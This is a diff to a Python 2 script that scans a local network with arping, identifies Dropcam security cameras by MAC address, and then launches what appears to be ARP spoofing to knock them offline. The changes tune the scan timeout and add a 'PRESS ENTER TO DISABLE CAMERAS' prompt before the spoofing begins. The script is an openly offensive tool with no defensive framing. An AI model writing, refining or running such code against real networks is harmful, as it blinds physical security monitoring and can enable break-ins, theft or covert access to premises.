@@ -1,7 +1,6 @@
 import netifaces, sys, commands, re, signal
 from iptools import ipv4
 from netaddr import IPNetwork
-from arprequest import ArpRequest
 from subprocess import Popen
 from time import sleep
 from pprint import pprint
@@ -33,7 +32,7 @@ def allIps(addr, netmask, ifname, gateway):
     X = '([a-fA-F0-9]{2}[:|\-]?){6}' # MAC matching regex
     print "---FINDING DROPCAMS ON NETWORK---"
     for host in list(network):
-        output = commands.getstatusoutput('arping -c 1 -W 0.1 ' + str(host))
+        output = commands.getstatusoutput('arping -c 1 -W 0.3 ' + str(host))
         a = re.compile(X).search(output[1])
         if a:
             mac = output[1][a.start(): a.end()]
@@ -43,6 +42,7 @@ def allIps(addr, netmask, ifname, gateway):
                 dropcams.append(str(host))
             print "Found MAC " + mac + " at IP " + str(host) + dropcam
     if len(dropcams) > 0:
+        raw_input("---PRESS ENTER TO DISABLE CAMERAS---")
         startSpoofing(ifname, gateway)
     else:
         print "---NO DROPCAMS FOUND ON NETWORK---"
